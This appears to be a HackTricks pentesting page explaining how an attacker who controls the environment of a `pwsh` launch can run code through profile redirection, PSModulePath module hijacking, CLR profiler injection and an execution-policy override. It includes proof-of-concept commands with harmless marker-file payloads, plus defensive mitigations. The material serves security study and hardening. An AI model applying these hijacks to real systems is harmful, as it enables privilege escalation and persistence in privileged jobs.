# macOS PowerShell Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

PowerShell is cross-platform: the same `pwsh` binary runs on macOS, Linux and Windows, and it is a **.NET (Core) application**. That gives an attacker who controls the environment of a `pwsh` invocation several environment-variable → code-execution primitives that work identically on all three OSes, plus a couple of Windows-only ones. All of them execute **before** (or instead of) the `-Command`/`-File` the victim intended to run, which makes them ideal against privileged wrappers, cron/`launchd`/systemd jobs and CI runners that shell out to `pwsh` with an inherited environment.

## `XDG_CONFIG_HOME` and PowerShell profiles

On macOS and Linux, PowerShell uses XDG configuration paths and executes user profile scripts when `pwsh` starts. Redirecting `XDG_CONFIG_HOME` changes the directory containing `powershell/profile.ps1` and the console-host-specific `powershell/Microsoft.PowerShell_profile.ps1`; a controlled file there can therefore execute before a `-Command` payload.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
mkdir -p /tmp/ps-config/powershell
cat >/tmp/ps-config/powershell/Microsoft.PowerShell_profile.ps1 <<'PS1'
New-Item -ItemType File -Path /tmp/powershell-profile-executed -Force | Out-Null
PS1

XDG_CONFIG_HOME=/tmp/ps-config pwsh -Command '$true'
```

This applies to PowerShell 6+ (`pwsh`) on non-Windows platforms; Windows PowerShell uses different profile locations. `pwsh -NoProfile` suppresses profile loading. Also inspect `HOME` and host-specific profile names because other PowerShell hosts can select different scripts.

> [!TIP]
> On **Windows** the profile paths are derived from `$HOME` / the *Documents* known folder (e.g. `Documents\PowerShell\Microsoft.PowerShell_profile.ps1` for `pwsh`, `Documents\WindowsPowerShell\...` for Windows PowerShell), so influencing `HOME`/`USERPROFILE` — or simply writing that file — is the equivalent primitive.

## `PSModulePath` module auto-loading hijack

Since PowerShell 3.0, **module auto-loading** imports a module automatically the first time a command it exports is referenced (invoked, `Get-Command`, or tab-completion). PowerShell recursively searches every directory listed in **`$Env:PSModulePath`** for `.psd1`/`.psm1` files, and on non-Windows the process-inherited `PSModulePath` is honoured as-is. So if you can **prepend a directory to `PSModulePath`**, you can plant a module that either matches a command the victim script calls or a module name the script `Import-Module`s — and your module-scope code runs at import time.<sup>[[3]](#references)</sup>

Because PowerShell command resolution is *Alias → Function → Cmdlet → Application*, a **function exported by your module can shadow a built-in cmdlet** the target uses (e.g. `Get-ChildItem`), so you do not even need the victim to import anything by name.

```bash
# Attacker-controlled module dir prepended to PSModulePath
mkdir -p /tmp/evil/Hijack
cat >/tmp/evil/Hijack/Hijack.psm1 <<'PS1'
# Top-level module code runs at import time
New-Item -ItemType File -Path /tmp/psmodulepath-executed -Force | Out-Null
function Invoke-Report { 'hijacked' }   # shadows whatever the victim calls
Export-ModuleMember -Function Invoke-Report
PS1
cat >/tmp/evil/Hijack/Hijack.psd1 <<'PS1'
@{ ModuleVersion = '1.0'; RootModule = 'Hijack.psm1'; FunctionsToExport = @('Invoke-Report') }
PS1

# Victim runs pwsh with an inherited/attacker-influenced PSModulePath and calls Invoke-Report
PSModulePath="/tmp/evil:$PSModulePath" pwsh -Command 'Invoke-Report'
test -e /tmp/psmodulepath-executed && echo 'PSModulePath auto-load executed'
```

On **Windows** the same applies (`;`-separated paths); `PSModulePath` also feeds from `HKCU:\Environment` and `HKLM:\...\Session Manager\Environment`, so a writable user-scope value is a persistence primitive too. Auto-loading can be disabled with `$PSModuleAutoloadingPreference = 'None'`, and `pwsh -NoProfile` does **not** stop it.

## CLR profiler injection (`CORECLR_PROFILER` / `COR_PROFILER`)

`pwsh` runs on .NET Core, so the **CLR profiling API** loads an attacker DLL/`.so`/`.dylib` into the process at startup purely from the environment — no signature, no COM registration needed because the `*_PATH` variables take precedence over the registry. The profiler library's `DllMain`/entry point executes inside the PowerShell process, which is a classic in-process code-execution and persistence technique (MITRE ATT&CK **T1574.012**).<sup>[[4]](#references)</sup>

```bash
# .NET Core / .NET 5+ (pwsh) — cross-platform. Use .so on Linux, .dylib on macOS, .dll on Windows.
CORECLR_ENABLE_PROFILING=1 \
CORECLR_PROFILER='{cf0d821e-299b-5307-a3d8-b283c03916db}' \
CORECLR_PROFILER_PATH=/tmp/evil_profiler.so \
  pwsh -Command '$true'
```

- On **.NET 8+** the variables can also use the newer `DOTNET_` prefix (`DOTNET_EnableDiagnostics=1`, `DOTNET_ENABLE_PROFILING=1`, `DOTNET_PROFILER`, `DOTNET_PROFILER_PATH`); `CORECLR_*` is kept for backwards compatibility.
- On **Windows PowerShell 5.1** (`powershell.exe`, .NET Framework) the equivalent trio is **`COR_ENABLE_PROFILING=1`**, **`COR_PROFILER={CLSID}`** and **`COR_PROFILER_PATH=C:\evil.dll`**.

The profiler DLL only needs to be a valid COM/ICorProfilerCallback library (or simply do its work from `DllMain`). Defensive launchers should strip `COR_*`/`CORECLR_*`/`DOTNET_*` from privileged environments.

## `DOTNET_STARTUP_HOOKS` (pre-`Main` .NET hook)

Because `pwsh` is a .NET Core application, **`DOTNET_STARTUP_HOOKS`** points at a managed assembly whose `StartupHook.Initialize()` runs synchronously before the host's `Main` — i.e. before PowerShell itself starts. This is the cleanest managed-code primitive and is shared with every other .NET app:

{{#ref}}
macos-.net-applications-injection.md
{{#endref}}

## `PSExecutionPolicyPreference` (Windows control bypass)

On Windows, setting the environment variable **`$Env:PSExecutionPolicyPreference`** (e.g. to `Bypass` or `Unrestricted`) overrides the effective Execution Policy for that process — this is exactly what `Set-ExecutionPolicy -Scope Process` writes. It is not code execution by itself, but it removes the "unsigned scripts are blocked" guardrail, which is often the missing link to make one of the primitives above (a planted profile / module) actually run. Execution Policy is Windows-only and was never a security boundary.<sup>[[5]](#references)</sup>

## References

- [1] [PowerShell environment variables and XDG paths](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_environment_variables)
- [2] [PowerShell profiles](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles)
- [3] [about_PSModulePath & module auto-loading](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_psmodulepath)
- [4] [.NET debugging & profiling config settings (CORECLR_/DOTNET_ profiler variables)](https://learn.microsoft.com/en-us/dotnet/core/runtime-config/debugging-profiling)
- [5] [about_Execution_Policies (PSExecutionPolicyPreference)](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies)

{{#include ../../../banners/hacktricks-training.md}}
